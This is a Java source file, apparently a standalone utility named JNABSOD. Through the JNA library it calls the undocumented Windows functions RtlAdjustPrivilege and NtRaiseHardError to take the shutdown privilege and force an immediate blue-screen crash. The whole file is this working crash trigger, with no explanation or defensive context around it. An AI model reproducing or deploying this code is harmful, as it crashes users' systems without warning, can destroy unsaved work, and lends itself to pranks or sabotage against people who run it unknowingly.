package de.intelligence.bsod;

import com.sun.jna.Function;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.win32.StdCallLibrary;

public final class JNABSOD {

    public static void main(String[] args) {
        final WinDef.HMODULE hModule = Kernel32.INSTANCE.GetModuleHandleA("ntdll");
        Function.getFunction(Kernel32.INSTANCE.GetProcAddress(hModule, "RtlAdjustPrivilege"))
                .invoke(new Object[] {19, true, false, new WinDef.BOOLByReference()});
        Function.getFunction(Kernel32.INSTANCE.GetProcAddress(hModule, "NtRaiseHardError"))
                .invoke(new Object[] {0xEEEEEEEEL, 0, 0, 0, 6, new WinDef.ULONGByReference()});
    }

    private interface Kernel32 extends StdCallLibrary {

        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        Pointer GetProcAddress(WinDef.HMODULE hModule, String lpProcName);

        WinDef.HMODULE GetModuleHandleA(String lpModuleName);

    }

}